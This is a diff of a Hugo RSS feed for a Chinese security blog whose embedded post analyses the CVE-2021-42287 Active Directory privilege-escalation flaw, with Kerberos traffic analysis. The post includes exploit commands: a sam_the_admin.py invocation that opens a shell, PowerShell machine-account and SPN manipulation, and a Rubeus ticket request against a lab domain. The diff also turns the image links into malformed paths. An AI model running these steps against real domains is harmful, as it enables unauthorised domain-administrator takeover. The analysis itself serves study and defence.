@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on T1ck1ng's Blog</title><link>https://blog.rm-rf.icu/post/</link><description>Recent content in Posts on T1ck1ng's Blog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Wed, 09 Sep 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.rm-rf.icu/post/index.xml" rel="self" type="application/rss+xml"/><item><title>CVE-2021-42287_域提权漏洞分析</title><link>https://blog.rm-rf.icu/p/cve-2021-42287_%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link><pubDate>Wed, 09 Sep 2020 00:00:00 +0000</pubDate><guid>https://blog.rm-rf.icu/p/cve-2021-42287_%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid><description>&lt;img src="https://typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220118141506204.png" alt="Featured image of post CVE-2021-42287_域提权漏洞分析" />&lt;h1 id="cve-2021-42287">CVE-2021-42287&lt;/h1>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on T1ck1ng's Blog</title><link>/post/</link><description>Recent content in Posts on T1ck1ng's Blog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Wed, 09 Sep 2020 00:00:00 +0000</lastBuildDate><atom:link href="/post/index.xml" rel="self" type="application/rss+xml"/><item><title>CVE-2021-42287_域提权漏洞分析</title><link>/p/cve-2021-42287_%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link><pubDate>Wed, 09 Sep 2020 00:00:00 +0000</pubDate><guid>/p/cve-2021-42287_%E5%9F%9F%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid><description>&lt;img src="https://typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220118141506204.png" alt="Featured image of post CVE-2021-42287_域提权漏洞分析" />&lt;h1 id="cve-2021-42287">CVE-2021-42287&lt;/h1>
 &lt;h2 id="0x01-kerberos认证过程">0x01 Kerberos认证过程&lt;/h2>
 &lt;div class="highlight">&lt;div class="chroma">
 &lt;table class="lntable">&lt;tr>&lt;td class="lntd">
@@ -35,7 +35,7 @@
 &lt;p>Exp: &lt;a class="link" href="https://github.com/WazeHell/sam-the-admin.git" target="_blank" rel="noopener"
 >https://github.com/WazeHell/sam-the-admin.git&lt;/a>&lt;/p>
 &lt;p>Payload: &lt;code>python3 sam_the_admin.py &amp;quot;doge.com/test:Hello123\!&amp;quot; -dc-ip 192.168.197.138 -shell&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220118141506204.png"
+&lt;p>&lt;img src="/https:/typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220118141506204.png"
 loading="lazy"
 alt="image-20220118141506204"
 >&lt;/p>
@@ -56,7 +56,7 @@ alt="image-20220118141506204"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">New-MachineAccount -MachineAccount work -Domain doge.com -Verbose
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220120095108327.png"
+&lt;/div>&lt;p>&lt;img src="/https:/typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220120095108327.png"
 loading="lazy"
 alt="image-20220120095108327"
 >&lt;/p>
@@ -79,7 +79,7 @@ alt="image-20220120095108327"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Set-DomainObject &lt;span class="s2">&amp;#34;CN=work,CN=Computers,DC=doge,DC=com&amp;#34;&lt;/span> -Clear &lt;span class="s1">&amp;#39;serviceprincipalname&amp;#39;&lt;/span> -Verbose
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220120104743755.png"
+&lt;/div>&lt;p>&lt;img src="/https:/typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220120104743755.png"
 loading="lazy"
 alt="image-20220120104743755"
 >&lt;/p>
@@ -105,7 +105,7 @@ alt="image-20220120104743755"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">./Rubeus.exe asktgt /user:ad /password:Test123 /domian:doge.com /dc:ad.doge.com /nowrap
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220120111003789.png"
+&lt;/div>&lt;p>&lt;img src="/https:/typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220120111003789.png"
 loading="lazy"
 alt="image-20220120111003789"
 >&lt;/p>
@@ -135,7 +135,7 @@ alt="image-20220120111003789"
 &lt;/ol>
 &lt;h2 id="0x04-流量分析">0x04 流量分析&lt;/h2>
 &lt;p>第四步中，获取TGT，对应的是AS_REQ和AS_REP阶段，&lt;/p>
-&lt;p>&lt;img src="https://typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220121093151837.png"
+&lt;p>&lt;img src="/https:/typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220121093151837.png"
 loading="lazy"
 alt="image-20220121093151837"
 >&lt;/p>
@@ -156,7 +156,7 @@ alt="image-20220121093151837"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PA-DATA PA-PAC-REQUEST：用于验证用户是否有权限访问某服务，这里为开启状态（include-pac: True）
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220121093940163.png"
+&lt;/div>&lt;p>&lt;img src="/https:/typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220121093940163.png"
 loading="lazy"
 alt="image-20220121093940163"
 >&lt;/p>
@@ -175,30 +175,30 @@ alt="image-20220121093940163"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">etype：加密类型
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220121094324283.png"
+&lt;/div>&lt;p>&lt;img src="/https:/typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220121094324283.png"
 loading="lazy"
 alt="image-20220121094324283"
 >&lt;/p>
 &lt;p>之后是AS_REP，此时已经获得了一个TGT，至此流程还是正常的。&lt;/p>
-&lt;p>&lt;img src="https://typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220121101431060.png"
+&lt;p>&lt;img src="/https:/typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220121101431060.png"
 loading="lazy"
 alt="image-20220121101431060"
 >&lt;/p>
 &lt;p>接下来是TGS_REQ阶段，查看tgs-req数据包中的padata，其分为两个结构，一个是PA-TGS-REQ，另一个是PA-FOR-USER。&lt;/p>
 &lt;p>PA-TGS-REQ用于下一步认证使用的会话密钥，通过&lt;code>session-key&lt;/code>作为密钥加密时间戳，用户名等信息。&lt;/p>
 &lt;p>在&lt;code>S4U2Self&lt;/code>协议扩展中，Service代表用户请求一个&lt;code>TGS Ticket&lt;/code>，KDC通过用户名和域名来识别用户，或者还有一种方式是通过证书来识别用户，如果通过用户名和域名来识别用户的话，Service会使用自己的TGT并添加一个新的padata，就是&lt;code>PA-FOR-USER&lt;/code>结构，由于使用S4U2Self请求cifs服务，所以这里也存在&lt;code>PA-FOR-USER&lt;/code>结构&lt;/p>
-&lt;p>&lt;img src="https://typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220121105241414.png"
+&lt;p>&lt;img src="/https:/typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220121105241414.png"
 loading="lazy"
 alt="image-20220121105241414"
 >&lt;/p>
 &lt;p>可以查看&lt;code>PA-FOR-USER&lt;/code>的结构，是代&lt;code>Administrator&lt;/code>的身份请求到cifs服务&lt;/p>
-&lt;p>&lt;img src="https://typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220121105643439.png"
+&lt;p>&lt;img src="/https:/typora-mine.oss-cn-beijing.aliyuncs.com/typora/image-20220121105643439.png"
 loading="lazy"
 alt="image-20220121105643439"
 >&lt;/p>
 &lt;p>这里传递的TGT是修改后的机器账户名&lt;code>ad&lt;/code>，申请tgt后该机器账户消失，TGS找不到账户，所以自动使用ad$的身份去创建服务票据。&lt;/p>
 &lt;p>最后查看TGS_REP中的pac部分，发现UserRID是500，也就是与administrator对应的值，至此获取了一个&lt;code>高权限的ST&lt;/code>。&lt;/p>
-&lt;p>&lt;img src="https://typora-mine.oss-cn-beijing.aliyuncs.com/typora/4416f63d-7cb0-460a-a544-ab2cf2cfab20.png"
+&lt;p>&lt;img src="/https:/typora-mine.oss-cn-beijing.aliyuncs.com/typora/4416f63d-7cb0-460a-a544-ab2cf2cfab20.png"
 loading="lazy"
 alt="PAC_LOGON_INFO"
 >&lt;/p>
